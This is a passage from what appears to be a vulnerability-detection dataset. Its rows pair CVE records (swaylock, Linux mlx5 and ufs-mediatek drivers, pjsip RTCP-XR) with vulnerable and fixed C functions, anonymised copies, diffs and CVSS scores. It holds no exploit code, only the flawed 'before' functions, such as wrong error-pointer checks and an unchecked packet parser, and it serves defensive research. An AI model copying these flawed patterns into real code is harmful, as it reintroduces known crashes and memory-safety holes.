		ext_session_lock_surface_v1_destroy(surface->ext_session_lock_surface_v1);
	}
	if (surface->surface != NULL) {
		wl_surface_destroy(surface->surface);
	}
	destroy_buffer(&surface->buffers[0]);
	destroy_buffer(&surface->buffers[1]);
	destroy_buffer(&surface->indicator_buffers[0]);
	destroy_buffer(&surface->indicator_buffers[1]);
	wl_output_destroy(surface->output);
	free(surface);
}","static void destroy_surface(struct swaylock_surface *VAR_0) {
	wl_list_remove(&VAR_0->link);
	if (VAR_0->layer_surface != NULL) {
		zwlr_layer_surface_v1_destroy(VAR_0->layer_surface);
	}
	if (VAR_0->ext_session_lock_surface_v1 != NULL) {
		ext_session_lock_surface_v1_destroy(VAR_0->ext_session_lock_surface_v1);
	}
	if (VAR_0->surface != NULL) {
		wl_surface_destroy(VAR_0->surface);
	}
	destroy_buffer(&VAR_0->buffers[0]);
	destroy_buffer(&VAR_0->buffers[1]);
	destroy_buffer(&VAR_0->indicator_buffers[0]);
	destroy_buffer(&VAR_0->indicator_buffers[1]);
	wl_output_destroy(VAR_0->output);
	free(VAR_0);
}",swaywm/swaylock/1d1c75b6316d21933069a9d201f966d84099f6ca/main.c/vul/after/2.json,"--- func_before
+++ func_after
@@ -2,6 +2,9 @@
 	wl_list_remove(&surface->link);
 	if (surface->layer_surface != NULL) {
 		zwlr_layer_surface_v1_destroy(surface->layer_surface);
+	}
+	if (surface->ext_session_lock_surface_v1 != NULL) {
+		ext_session_lock_surface_v1_destroy(surface->ext_session_lock_surface_v1);
 	}
 	if (surface->surface != NULL) {
 		wl_surface_destroy(surface->surface);","{'deleted_lines': [], 'added_lines': ['\t}', '\tif (surface->ext_session_lock_surface_v1 != NULL) {', '\t\text_session_lock_surface_v1_destroy(surface->ext_session_lock_surface_v1);']}",True,swaylock before 1.6 allows attackers to trigger a crash and achieve unlocked access to a Wayland compositor.,9.1,CRITICAL,3,valid,2021-12-20T16:25:44Z,4
CVE-2023-23006,['CWE-476'],CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H,1,torvalds/linux,"net/mlx5: DR, Fix NULL vs IS_ERR checking in dr_domain_init_resources

The mlx5_get_uars_page() function  returns error pointers.
Using IS_ERR() to check the return value to fix this.

Fixes: 4ec9e7b02697 (""net/mlx5: DR, Expose steering domain functionality"")
Signed-off-by: Miaoqian Lin <linmq006@gmail.com>
Signed-off-by: Saeed Mahameed <saeedm@nvidia.com>",6b8b42585886c59a008015083282aae434349094,https://github.com/torvalds/linux/commit/6b8b42585886c59a008015083282aae434349094,drivers/net/ethernet/mellanox/mlx5/core/steering/dr_domain.c,dr_domain_init_resources,"static int dr_domain_init_resources(struct mlx5dr_domain *dmn)
{
int ret;
dmn->ste_ctx = mlx5dr_ste_get_ctx(dmn->info.caps.sw_format_ver);
if (!dmn->ste_ctx) {
mlx5dr_err(dmn, ""SW Steering on this device is unsupported\n"");
return -EOPNOTSUPP;
}
ret = mlx5_core_alloc_pd(dmn->mdev, &dmn->pdn);
if (ret) {
mlx5dr_err(dmn, ""Couldn't allocate PD, ret: %d"", ret);
return ret;
}
dmn->uar = mlx5_get_uars_page(dmn->mdev);
if (!dmn->uar) {
mlx5dr_err(dmn, ""Couldn't allocate UAR\n"");
ret = -ENOMEM;
goto clean_pd;
}
dmn->ste_icm_pool = mlx5dr_icm_pool_create(dmn, DR_ICM_TYPE_STE);
if (!dmn->ste_icm_pool) {
mlx5dr_err(dmn, ""Couldn't get icm memory\n"");
ret = -ENOMEM;
goto clean_uar;
}
dmn->action_icm_pool = mlx5dr_icm_pool_create(dmn, DR_ICM_TYPE_MODIFY_ACTION);
if (!dmn->action_icm_pool) {
mlx5dr_err(dmn, ""Couldn't get action icm memory\n"");
ret = -ENOMEM;
goto free_ste_icm_pool;
}
ret = mlx5dr_send_ring_alloc(dmn);
if (ret) {
mlx5dr_err(dmn, ""Couldn't create send-ring\n"");
goto free_action_icm_pool;
}
return 0;
free_action_icm_pool:
mlx5dr_icm_pool_destroy(dmn->action_icm_pool);
free_ste_icm_pool:
mlx5dr_icm_pool_destroy(dmn->ste_icm_pool);
clean_uar:
mlx5_put_uars_page(dmn->mdev, dmn->uar);
clean_pd:
mlx5_core_dealloc_pd(dmn->mdev, dmn->pdn);
return ret;
}","static int dr_domain_init_resources(struct mlx5dr_domain *VAR_0)
{
int VAR_1;
VAR_0->ste_ctx = mlx5dr_ste_get_ctx(VAR_0->info.caps.sw_format_ver);
if (!VAR_0->ste_ctx) {
mlx5dr_err(VAR_0, ""SW Steering on this device is unsupported\n"");
return -VAR_2;
}
VAR_1 = mlx5_core_alloc_pd(VAR_0->mdev, &VAR_0->pdn);
if (VAR_1) {
mlx5dr_err(VAR_0, ""Couldn't allocate PD, ret: %d"", VAR_1);
return VAR_1;
}
VAR_0->uar = mlx5_get_uars_page(VAR_0->mdev);
if (!VAR_0->uar) {
mlx5dr_err(VAR_0, ""Couldn't allocate UAR\n"");
VAR_1 = -VAR_3;
goto clean_pd;
}
VAR_0->ste_icm_pool = mlx5dr_icm_pool_create(VAR_0, VAR_4);
if (!VAR_0->ste_icm_pool) {
mlx5dr_err(VAR_0, ""Couldn't get icm memory\n"");
VAR_1 = -VAR_3;
goto clean_uar;
}
VAR_0->action_icm_pool = mlx5dr_icm_pool_create(VAR_0, VAR_5);
if (!VAR_0->action_icm_pool) {
mlx5dr_err(VAR_0, ""Couldn't get action icm memory\n"");
VAR_1 = -VAR_3;
goto free_ste_icm_pool;
}
VAR_1 = mlx5dr_send_ring_alloc(VAR_0);
if (VAR_1) {
mlx5dr_err(VAR_0, ""Couldn't create send-ring\n"");
goto free_action_icm_pool;
}
return 0;
free_action_icm_pool:
mlx5dr_icm_pool_destroy(VAR_0->action_icm_pool);
free_ste_icm_pool:
mlx5dr_icm_pool_destroy(VAR_0->ste_icm_pool);
clean_uar:
mlx5_put_uars_page(VAR_0->mdev, VAR_0->uar);
clean_pd:
mlx5_core_dealloc_pd(VAR_0->mdev, VAR_0->pdn);
return VAR_1;
}",torvalds/linux/6b8b42585886c59a008015083282aae434349094/dr_domain.c/vul/before/0.json,"static int dr_domain_init_resources(struct mlx5dr_domain *dmn)
{
	int ret;

	dmn->ste_ctx = mlx5dr_ste_get_ctx(dmn->info.caps.sw_format_ver);
	if (!dmn->ste_ctx) {
		mlx5dr_err(dmn, ""SW Steering on this device is unsupported\n"");
		return -EOPNOTSUPP;
	}

	ret = mlx5_core_alloc_pd(dmn->mdev, &dmn->pdn);
	if (ret) {
		mlx5dr_err(dmn, ""Couldn't allocate PD, ret: %d"", ret);
		return ret;
	}

	dmn->uar = mlx5_get_uars_page(dmn->mdev);
	if (IS_ERR(dmn->uar)) {
		mlx5dr_err(dmn, ""Couldn't allocate UAR\n"");
		ret = PTR_ERR(dmn->uar);
		goto clean_pd;
	}

	dmn->ste_icm_pool = mlx5dr_icm_pool_create(dmn, DR_ICM_TYPE_STE);
	if (!dmn->ste_icm_pool) {
		mlx5dr_err(dmn, ""Couldn't get icm memory\n"");
		ret = -ENOMEM;
		goto clean_uar;
	}

	dmn->action_icm_pool = mlx5dr_icm_pool_create(dmn, DR_ICM_TYPE_MODIFY_ACTION);
	if (!dmn->action_icm_pool) {
		mlx5dr_err(dmn, ""Couldn't get action icm memory\n"");
		ret = -ENOMEM;
		goto free_ste_icm_pool;
	}

	ret = mlx5dr_send_ring_alloc(dmn);
	if (ret) {
		mlx5dr_err(dmn, ""Couldn't create send-ring\n"");
		goto free_action_icm_pool;
	}

	return 0;

free_action_icm_pool:
	mlx5dr_icm_pool_destroy(dmn->action_icm_pool);
free_ste_icm_pool:
	mlx5dr_icm_pool_destroy(dmn->ste_icm_pool);
clean_uar:
	mlx5_put_uars_page(dmn->mdev, dmn->uar);
clean_pd:
	mlx5_core_dealloc_pd(dmn->mdev, dmn->pdn);

	return ret;
}","static int dr_domain_init_resources(struct mlx5dr_domain *VAR_0)
{
	int VAR_1;

	VAR_0->ste_ctx = mlx5dr_ste_get_ctx(VAR_0->info.caps.sw_format_ver);
	if (!VAR_0->ste_ctx) {
		mlx5dr_err(VAR_0, ""SW Steering on this device is unsupported\n"");
		return -VAR_2;
	}

	VAR_1 = mlx5_core_alloc_pd(VAR_0->mdev, &VAR_0->pdn);
	if (VAR_1) {
		mlx5dr_err(VAR_0, ""Couldn't allocate PD, ret: %d"", VAR_1);
		return VAR_1;
	}

	VAR_0->uar = mlx5_get_uars_page(VAR_0->mdev);
	if (IS_ERR(VAR_0->uar)) {
		mlx5dr_err(VAR_0, ""Couldn't allocate UAR\n"");
		VAR_1 = PTR_ERR(VAR_0->uar);
		goto clean_pd;
	}

	VAR_0->ste_icm_pool = mlx5dr_icm_pool_create(VAR_0, VAR_3);
	if (!VAR_0->ste_icm_pool) {
		mlx5dr_err(VAR_0, ""Couldn't get icm memory\n"");
		VAR_1 = -VAR_4;
		goto clean_uar;
	}

	VAR_0->action_icm_pool = mlx5dr_icm_pool_create(VAR_0, VAR_5);
	if (!VAR_0->action_icm_pool) {
		mlx5dr_err(VAR_0, ""Couldn't get action icm memory\n"");
		VAR_1 = -VAR_4;
		goto free_ste_icm_pool;
	}

	VAR_1 = mlx5dr_send_ring_alloc(VAR_0);
	if (VAR_1) {
		mlx5dr_err(VAR_0, ""Couldn't create send-ring\n"");
		goto free_action_icm_pool;
	}

	return 0;

free_action_icm_pool:
	mlx5dr_icm_pool_destroy(VAR_0->action_icm_pool);
free_ste_icm_pool:
	mlx5dr_icm_pool_destroy(VAR_0->ste_icm_pool);
clean_uar:
	mlx5_put_uars_page(VAR_0->mdev, VAR_0->uar);
clean_pd:
	mlx5_core_dealloc_pd(VAR_0->mdev, VAR_0->pdn);

	return VAR_1;
}",torvalds/linux/6b8b42585886c59a008015083282aae434349094/dr_domain.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -15,9 +15,9 @@
 	}
 
 	dmn->uar = mlx5_get_uars_page(dmn->mdev);
-	if (!dmn->uar) {
+	if (IS_ERR(dmn->uar)) {
 		mlx5dr_err(dmn, ""Couldn't allocate UAR\n"");
-		ret = -ENOMEM;
+		ret = PTR_ERR(dmn->uar);
 		goto clean_pd;
 	}
 ","{'deleted_lines': ['\tif (!dmn->uar) {', '\t\tret = -ENOMEM;'], 'added_lines': ['\tif (IS_ERR(dmn->uar)) {', '\t\tret = PTR_ERR(dmn->uar);']}",True,"In the Linux kernel before 5.15.13, drivers/net/ethernet/mellanox/mlx5/core/steering/dr_domain.c misinterprets the mlx5_get_uars_page return value (expects it to be NULL in the error case, whereas it is actually an error pointer).",5.5,MEDIUM,1,valid,2021-12-22T06:54:53Z,4
CVE-2023-23001,['CWE-476'],CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H,1,torvalds/linux,"scsi: ufs: ufs-mediatek: Fix error checking in ufs_mtk_init_va09_pwr_ctrl()

The function regulator_get() returns an error pointer. Use IS_ERR() to
validate the return value.

Link: https://lore.kernel.org/r/20211222070930.9449-1-linmq006@gmail.com
Fixes: cf137b3ea49a (""scsi: ufs-mediatek: Support VA09 regulator operations"")
Signed-off-by: Miaoqian Lin <linmq006@gmail.com>
Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>",3ba880a12df5aa4488c18281701b5b1bc3d4531a,https://github.com/torvalds/linux/commit/3ba880a12df5aa4488c18281701b5b1bc3d4531a,drivers/scsi/ufs/ufs-mediatek.c,ufs_mtk_init_va09_pwr_ctrl,"static void ufs_mtk_init_va09_pwr_ctrl(struct ufs_hba *hba)
{
struct ufs_mtk_host *host = ufshcd_get_variant(hba);
host->reg_va09 = regulator_get(hba->dev, ""va09"");
if (!host->reg_va09)
dev_info(hba->dev, ""failed to get va09"");
else
host->caps |= UFS_MTK_CAP_VA09_PWR_CTRL;
}","static void ufs_mtk_init_va09_pwr_ctrl(struct ufs_hba *VAR_0)
{
struct ufs_mtk_host *VAR_1 = ufshcd_get_variant(VAR_0);
VAR_1->reg_va09 = regulator_get(VAR_0->dev, ""va09"");
if (!VAR_1->reg_va09)
dev_info(VAR_0->dev, ""failed to get va09"");
else
VAR_1->caps |= VAR_2;
}",torvalds/linux/3ba880a12df5aa4488c18281701b5b1bc3d4531a/ufs-mediatek.c/vul/before/0.json,"static void ufs_mtk_init_va09_pwr_ctrl(struct ufs_hba *hba)
{
	struct ufs_mtk_host *host = ufshcd_get_variant(hba);

	host->reg_va09 = regulator_get(hba->dev, ""va09"");
	if (IS_ERR(host->reg_va09))
		dev_info(hba->dev, ""failed to get va09"");
	else
		host->caps |= UFS_MTK_CAP_VA09_PWR_CTRL;
}","static void ufs_mtk_init_va09_pwr_ctrl(struct ufs_hba *VAR_0)
{
	struct ufs_mtk_host *VAR_1 = ufshcd_get_variant(VAR_0);

	VAR_1->reg_va09 = regulator_get(VAR_0->dev, ""va09"");
	if (IS_ERR(VAR_1->reg_va09))
		dev_info(VAR_0->dev, ""failed to get va09"");
	else
		VAR_1->caps |= VAR_2;
}",torvalds/linux/3ba880a12df5aa4488c18281701b5b1bc3d4531a/ufs-mediatek.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -3,7 +3,7 @@
 	struct ufs_mtk_host *host = ufshcd_get_variant(hba);
 
 	host->reg_va09 = regulator_get(hba->dev, ""va09"");
-	if (!host->reg_va09)
+	if (IS_ERR(host->reg_va09))
 		dev_info(hba->dev, ""failed to get va09"");
 	else
 		host->caps |= UFS_MTK_CAP_VA09_PWR_CTRL;","{'deleted_lines': ['\tif (!host->reg_va09)'], 'added_lines': ['\tif (IS_ERR(host->reg_va09))']}",True,"In the Linux kernel before 5.16.3, drivers/scsi/ufs/ufs-mediatek.c misinterprets the regulator_get return value (expects it to be NULL in the error case, whereas it is actually an error pointer).",5.5,MEDIUM,1,valid,2021-12-22T07:09:30Z,4
CVE-2021-43845,['CWE-125'],AV:N/AC:L/Au:N/C:P/I:N/A:P,0,pjsip/pjproject,Merge pull request from GHSA-r374-qrwv-86hh,f74c1fc22b760d2a24369aa72c74c4a9ab985859,https://github.com/pjsip/pjproject/commit/f74c1fc22b760d2a24369aa72c74c4a9ab985859,pjmedia/src/pjmedia/rtcp_xr.c,pjmedia_rtcp_xr_rx_rtcp_xr,"void pjmedia_rtcp_xr_rx_rtcp_xr( pjmedia_rtcp_xr_session *sess,
const void *pkt,
pj_size_t size)
{
const pjmedia_rtcp_xr_pkt      *rtcp_xr = (pjmedia_rtcp_xr_pkt*) pkt;
const pjmedia_rtcp_xr_rb_rr_time  *rb_rr_time = NULL;
const pjmedia_rtcp_xr_rb_dlrr     *rb_dlrr = NULL;
const pjmedia_rtcp_xr_rb_stats    *rb_stats = NULL;
const pjmedia_rtcp_xr_rb_voip_mtc *rb_voip_mtc = NULL;
const pjmedia_rtcp_xr_rb_header   *rb_hdr = (pjmedia_rtcp_xr_rb_header*) 
rtcp_xr->buf;
unsigned pkt_len, rb_len;
if (rtcp_xr->common.pt != RTCP_XR)
return;
pkt_len = pj_ntohs((pj_uint16_t)rtcp_xr->common.length);
if ((pkt_len + 1) > (size / 4))
return;
while ((pj_int32_t*)rb_hdr < (pj_int32_t*)pkt + pkt_len)
{
rb_len = pj_ntohs((pj_uint16_t)rb_hdr->length);
if (rb_len) {
switch (rb_hdr->bt) {
case BT_RR_TIME:
rb_rr_time = (pjmedia_rtcp_xr_rb_rr_time*) rb_hdr;
break;
case BT_DLRR:
rb_dlrr = (pjmedia_rtcp_xr_rb_dlrr*) rb_hdr;
break;
case BT_STATS:
rb_stats = (pjmedia_rtcp_xr_rb_stats*) rb_hdr;
break;
case BT_VOIP_METRICS:
rb_voip_mtc = (pjmedia_rtcp_xr_rb_voip_mtc*) rb_hdr;
break;
default:
break;
}
}
rb_hdr = (pjmedia_rtcp_xr_rb_header*)
((pj_int32_t*)rb_hdr + rb_len + 1);
}
if (rb_rr_time) {
sess->rx_lrr = ((pj_ntohl(rb_rr_time->ntp_sec) & 0x0000FFFF) << 16) | 
((pj_ntohl(rb_rr_time->ntp_frac) >> 16) & 0xFFFF);
pj_get_timestamp(&sess->rx_lrr_time);
TRACE_((sess->name, ""Rx RTCP SR: ntp_ts=%p"", sess->rx_lrr,
(pj_uint32_t)(sess->rx_lrr_time.u64*65536/
sess->rtcp_session->ts_freq.u64)));
}
if (rb_dlrr) {
pj_uint32_t lrr, now, dlrr;
pj_uint64_t eedelay;
pjmedia_rtcp_ntp_rec ntp;
lrr = pj_ntohl(rb_dlrr->item.lrr);
dlrr = pj_ntohl(rb_dlrr->item.dlrr);
pjmedia_rtcp_get_ntp_time(sess->rtcp_session, &ntp);
now = ((ntp.hi & 0xFFFF) << 16) + (ntp.lo >> 16);
eedelay = now - lrr - dlrr;
if (eedelay < 4294) {
eedelay = (eedelay * 1000000) >> 16;
} else {
eedelay = (eedelay * 1000) >> 16;
eedelay *= 1000;
}
TRACE_((sess->name, ""Rx RTCP XR DLRR: lrr=%p, dlrr=%p (%d:%03dms), ""
""now=%p, rtt=%p"",
lrr, dlrr, dlrr/65536, (dlrr%65536)*1000/65536,
now, (pj_uint32_t)eedelay));
if (now-dlrr >= lrr) {
unsigned rtt = (pj_uint32_t)eedelay;
if (eedelay <= 30 * 1000 * 1000UL) {
if (rtt>((unsigned)sess->stat.rtt.mean*3) && sess->stat.rtt.n!=0)
{
unsigned orig_rtt = rtt;
rtt = (unsigned)sess->stat.rtt.mean*3;
PJ_LOG(5,(sess->name, 
""RTT value %d usec is normalized to %d usec"",
orig_rtt, rtt));
}
TRACE_((sess->name, ""RTCP RTT is set to %d usec"", rtt));
pj_math_stat_update(&sess->stat.rtt, rtt);
}
} else {
PJ_LOG(5, (sess->name, ""Internal RTCP NTP clock skew detected: ""
""lrr=%p, now=%p, dlrr=%p (%d:%03dms), ""
""diff=%d"",
lrr, now, dlrr, dlrr/65536,
(dlrr%65536)*1000/65536,
dlrr-(now-lrr)));
}
}
if (rb_stats) {
pj_uint8_t flags = rb_stats->header.specific;
pj_bzero(&sess->stat.tx.stat_sum, sizeof(sess->stat.tx.stat_sum));
sess->stat.tx.stat_sum.begin_seq = pj_ntohs(rb_stats->begin_seq);
sess->stat.tx.stat_sum.end_seq   = pj_ntohs(rb_stats->end_seq);
sess->stat.tx.stat_sum.l = (flags & (1 << 7)) != 0;
sess->stat.tx.stat_sum.d = (flags & (1 << 6)) != 0;
sess->stat.tx.stat_sum.j = (flags & (1 << 5)) != 0;
sess->stat.tx.stat_sum.t = (flags & (3 << 3)) != 0;
if (sess->stat.tx.stat_sum.l) {
sess->stat.tx.stat_sum.lost = pj_ntohl(rb_stats->lost);
}
if (sess->stat.tx.stat_sum.d) {
sess->stat.tx.stat_sum.dup = pj_ntohl(rb_stats->dup);
}
if (sess->stat.tx.stat_sum.j) {
sess->stat.tx.stat_sum.jitter.min = pj_ntohl(rb_stats->jitter_min);
sess->stat.tx.stat_sum.jitter.max = pj_ntohl(rb_stats->jitter_max);
sess->stat.tx.stat_sum.jitter.mean= pj_ntohl(rb_stats->jitter_mean);
pj_math_stat_set_stddev(&sess->stat.tx.stat_sum.jitter, 
pj_ntohl(rb_stats->jitter_dev));
}
if (sess->stat.tx.stat_sum.t) {
sess->stat.tx.stat_sum.toh.min = rb_stats->toh_min;
sess->stat.tx.stat_sum.toh.max = rb_stats->toh_max;
sess->stat.tx.stat_sum.toh.mean= rb_stats->toh_mean;
pj_math_stat_set_stddev(&sess->stat.tx.stat_sum.toh, 
pj_ntohl(rb_stats->toh_dev));
}
pj_gettimeofday(&sess->stat.tx.stat_sum.update);
}
if (rb_voip_mtc) {
sess->stat.tx.voip_mtc.loss_rate = rb_voip_mtc->loss_rate;
sess->stat.tx.voip_mtc.discard_rate = rb_voip_mtc->discard_rate;
sess->stat.tx.voip_mtc.burst_den = rb_voip_mtc->burst_den;
sess->stat.tx.voip_mtc.gap_den = rb_voip_mtc->gap_den;
sess->stat.tx.voip_mtc.burst_dur = pj_ntohs(rb_voip_mtc->burst_dur);
sess->stat.tx.voip_mtc.gap_dur = pj_ntohs(rb_voip_mtc->gap_dur);
sess->stat.tx.voip_mtc.rnd_trip_delay = 
pj_ntohs(rb_voip_mtc->rnd_trip_delay);
sess->stat.tx.voip_mtc.end_sys_delay = 
pj_ntohs(rb_voip_mtc->end_sys_delay);
sess->stat.tx.voip_mtc.signal_lvl = (pj_int8_t)
((rb_voip_mtc->signal_lvl > 127)?
((int)rb_voip_mtc->signal_lvl - 256) : 
rb_voip_mtc->signal_lvl);
sess->stat.tx.voip_mtc.noise_lvl  = (pj_int8_t)
((rb_voip_mtc->noise_lvl > 127)?
((int)rb_voip_mtc->noise_lvl - 256) : 
rb_voip_mtc->noise_lvl);
sess->stat.tx.voip_mtc.rerl = rb_voip_mtc->rerl;
sess->stat.tx.voip_mtc.gmin = rb_voip_mtc->gmin;
sess->stat.tx.voip_mtc.r_factor = rb_voip_mtc->r_factor;
sess->stat.tx.voip_mtc.ext_r_factor = rb_voip_mtc->ext_r_factor;
sess->stat.tx.voip_mtc.mos_lq = rb_voip_mtc->mos_lq;
sess->stat.tx.voip_mtc.mos_cq = rb_voip_mtc->mos_cq;
sess->stat.tx.voip_mtc.rx_config = rb_voip_mtc->rx_config;
sess->stat.tx.voip_mtc.jb_nom = pj_ntohs(rb_voip_mtc->jb_nom);
sess->stat.tx.voip_mtc.jb_max = pj_ntohs(rb_voip_mtc->jb_max);
sess->stat.tx.voip_mtc.jb_abs_max = pj_ntohs(rb_voip_mtc->jb_abs_max);
pj_gettimeofday(&sess->stat.tx.voip_mtc.update);
}
}","void pjmedia_rtcp_xr_rx_rtcp_xr( pjmedia_rtcp_xr_session *VAR_0,
const void *VAR_1,
pj_size_t VAR_2)
{
const pjmedia_rtcp_xr_pkt      *VAR_3 = (pjmedia_rtcp_xr_pkt*) VAR_1;
const pjmedia_rtcp_xr_rb_rr_time  *VAR_4 = NULL;
const pjmedia_rtcp_xr_rb_dlrr     *VAR_5 = NULL;
const pjmedia_rtcp_xr_rb_stats    *VAR_6 = NULL;
const pjmedia_rtcp_xr_rb_voip_mtc *VAR_7 = NULL;
const pjmedia_rtcp_xr_rb_header   *VAR_8 = (pjmedia_rtcp_xr_rb_header*) 
VAR_3->buf;
unsigned VAR_9, VAR_10;
if (VAR_3->common.pt != VAR_11)
return;
VAR_9 = pj_ntohs((pj_uint16_t)VAR_3->common.length);
if ((VAR_9 + 1) > (VAR_2 / 4))
return;
while ((pj_int32_t*)VAR_8 < (pj_int32_t*)VAR_1 + VAR_9)
{
VAR_10 = pj_ntohs((pj_uint16_t)VAR_8->length);
if (VAR_10) {
switch (VAR_8->bt) {
case VAR_12:
VAR_4 = (pjmedia_rtcp_xr_rb_rr_time*) VAR_8;
break;
case VAR_13:
VAR_5 = (pjmedia_rtcp_xr_rb_dlrr*) VAR_8;
break;
case VAR_14:
VAR_6 = (pjmedia_rtcp_xr_rb_stats*) VAR_8;
break;
case VAR_15:
VAR_7 = (pjmedia_rtcp_xr_rb_voip_mtc*) VAR_8;
break;
default:
break;
}
}
VAR_8 = (pjmedia_rtcp_xr_rb_header*)
((pj_int32_t*)VAR_8 + VAR_10 + 1);
}
if (VAR_4) {
VAR_0->rx_lrr = ((pj_ntohl(VAR_4->ntp_sec) & 0x0000FFFF) << 16) | 
((pj_ntohl(VAR_4->ntp_frac) >> 16) & 0xFFFF);
pj_get_timestamp(&VAR_0->rx_lrr_time);
TRACE_((VAR_0->name, ""Rx RTCP SR: ntp_ts=%p"", VAR_0->rx_lrr,
(VAR_16)(VAR_0->rx_lrr_time.u64*65536/
VAR_0->rtcp_session->ts_freq.u64)));
}
if (VAR_5) {
pj_uint32_t VAR_17, VAR_18, VAR_19;
pj_uint64_t VAR_20;
pjmedia_rtcp_ntp_rec VAR_21;
VAR_17 = pj_ntohl(VAR_5->item.lrr);
VAR_19 = pj_ntohl(VAR_5->item.dlrr);
pjmedia_rtcp_get_ntp_time(VAR_0->rtcp_session, &VAR_21);
VAR_18 = ((VAR_21.hi & 0xFFFF) << 16) + (VAR_21.lo >> 16);
VAR_20 = VAR_18 - VAR_17 - VAR_19;
if (VAR_20 < 4294) {
VAR_20 = (VAR_20 * 1000000) >> 16;
} else {
VAR_20 = (VAR_20 * 1000) >> 16;
VAR_20 *= 1000;
}
TRACE_((VAR_0->name, ""Rx RTCP XR DLRR: lrr=%p, dlrr=%p (%d:%03dms), ""
""now=%p, rtt=%p"",
VAR_17, VAR_19, VAR_19/65536, (VAR_19%65536)*1000/65536,
VAR_18, (pj_uint32_t)VAR_20));
if (VAR_18-VAR_19 >= VAR_17) {
unsigned VAR_22 = (pj_uint32_t)VAR_20;
if (VAR_20 <= 30 * 1000 * 1000UL) {
if (VAR_22>((unsigned)VAR_0->stat.rtt.mean*3) && VAR_0->stat.rtt.n!=0)
{
unsigned VAR_23 = VAR_22;
VAR_22 = (unsigned)VAR_0->stat.rtt.mean*3;
PJ_LOG(5,(VAR_0->name, 
""RTT value %d usec is normalized to %d usec"",
VAR_23, VAR_22));
}
TRACE_((VAR_0->name, ""RTCP RTT is set to %d usec"", VAR_22));
pj_math_stat_update(&VAR_0->stat.rtt, VAR_22);
}
} else {
PJ_LOG(5, (VAR_0->name, ""Internal RTCP NTP clock skew detected: ""
""lrr=%p, now=%p, dlrr=%p (%d:%03dms), ""
""diff=%d"",
VAR_17, VAR_18, VAR_19, VAR_19/65536,
(VAR_19%65536)*1000/65536,
VAR_19-(VAR_18-VAR_17)));
}
}
if (VAR_6) {
pj_uint8_t VAR_24 = VAR_6->header.specific;
pj_bzero(&VAR_0->stat.tx.stat_sum, sizeof(VAR_0->stat.tx.stat_sum));
VAR_0->stat.tx.stat_sum.begin_seq = pj_ntohs(VAR_6->begin_seq);
VAR_0->stat.tx.stat_sum.end_seq   = pj_ntohs(VAR_6->end_seq);
VAR_0->stat.tx.stat_sum.l = (VAR_24 & (1 << 7)) != 0;
VAR_0->stat.tx.stat_sum.d = (VAR_24 & (1 << 6)) != 0;
VAR_0->stat.tx.stat_sum.j = (VAR_24 & (1 << 5)) != 0;
VAR_0->stat.tx.stat_sum.t = (VAR_24 & (3 << 3)) != 0;
if (VAR_0->stat.tx.stat_sum.l) {
VAR_0->stat.tx.stat_sum.lost = pj_ntohl(VAR_6->lost);
}
if (VAR_0->stat.tx.stat_sum.d) {
VAR_0->stat.tx.stat_sum.dup = pj_ntohl(VAR_6->dup);
}
if (VAR_0->stat.tx.stat_sum.j) {
VAR_0->stat.tx.stat_sum.jitter.min = pj_ntohl(VAR_6->jitter_min);
VAR_0->stat.tx.stat_sum.jitter.max = pj_ntohl(VAR_6->jitter_max);
VAR_0->stat.tx.stat_sum.jitter.mean= pj_ntohl(VAR_6->jitter_mean);
pj_math_stat_set_stddev(&VAR_0->stat.tx.stat_sum.jitter, 
pj_ntohl(VAR_6->jitter_dev));
}
if (VAR_0->stat.tx.stat_sum.t) {
VAR_0->stat.tx.stat_sum.toh.min = VAR_6->toh_min;
VAR_0->stat.tx.stat_sum.toh.max = VAR_6->toh_max;
VAR_0->stat.tx.stat_sum.toh.mean= VAR_6->toh_mean;
pj_math_stat_set_stddev(&VAR_0->stat.tx.stat_sum.toh, 
pj_ntohl(VAR_6->toh_dev));
}
pj_gettimeofday(&VAR_0->stat.tx.stat_sum.update);
}
if (VAR_7) {
VAR_0->stat.tx.voip_mtc.loss_rate = VAR_7->loss_rate;
VAR_0->stat.tx.voip_mtc.discard_rate = VAR_7->discard_rate;
VAR_0->stat.tx.voip_mtc.burst_den = VAR_7->burst_den;
VAR_0->stat.tx.voip_mtc.gap_den = VAR_7->gap_den;
VAR_0->stat.tx.voip_mtc.burst_dur = pj_ntohs(VAR_7->burst_dur);
VAR_0->stat.tx.voip_mtc.gap_dur = pj_ntohs(VAR_7->gap_dur);
VAR_0->stat.tx.voip_mtc.rnd_trip_delay = 
pj_ntohs(VAR_7->rnd_trip_delay);
VAR_0->stat.tx.voip_mtc.end_sys_delay = 
pj_ntohs(VAR_7->end_sys_delay);
VAR_0->stat.tx.voip_mtc.signal_lvl = (VAR_25)
((VAR_7->signal_lvl > 127)?
((int)VAR_7->signal_lvl - 256) : 
VAR_7->signal_lvl);
VAR_0->stat.tx.voip_mtc.noise_lvl  = (VAR_25)
((VAR_7->noise_lvl > 127)?
((int)VAR_7->noise_lvl - 256) : 
VAR_7->noise_lvl);
VAR_0->stat.tx.voip_mtc.rerl = VAR_7->rerl;
VAR_0->stat.tx.voip_mtc.gmin = VAR_7->gmin;
VAR_0->stat.tx.voip_mtc.r_factor = VAR_7->r_factor;
VAR_0->stat.tx.voip_mtc.ext_r_factor = VAR_7->ext_r_factor;
VAR_0->stat.tx.voip_mtc.mos_lq = VAR_7->mos_lq;
VAR_0->stat.tx.voip_mtc.mos_cq = VAR_7->mos_cq;
VAR_0->stat.tx.voip_mtc.rx_config = VAR_7->rx_config;
VAR_0->stat.tx.voip_mtc.jb_nom = pj_ntohs(VAR_7->jb_nom);
VAR_0->stat.tx.voip_mtc.jb_max = pj_ntohs(VAR_7->jb_max);
VAR_0->stat.tx.voip_mtc.jb_abs_max = pj_ntohs(VAR_7->jb_abs_max);
pj_gettimeofday(&VAR_0->stat.tx.voip_mtc.update);
}
}",pjsip/pjproject/f74c1fc22b760d2a24369aa72c74c4a9ab985859/rtcp_xr.c/vul/before/0.json,"void pjmedia_rtcp_xr_rx_rtcp_xr( pjmedia_rtcp_xr_session *sess,
				 const void *pkt,
				 pj_size_t size)
{
    const pjmedia_rtcp_xr_pkt	      *rtcp_xr = (pjmedia_rtcp_xr_pkt*) pkt;
    const pjmedia_rtcp_xr_rb_rr_time  *rb_rr_time = NULL;
    const pjmedia_rtcp_xr_rb_dlrr     *rb_dlrr = NULL;
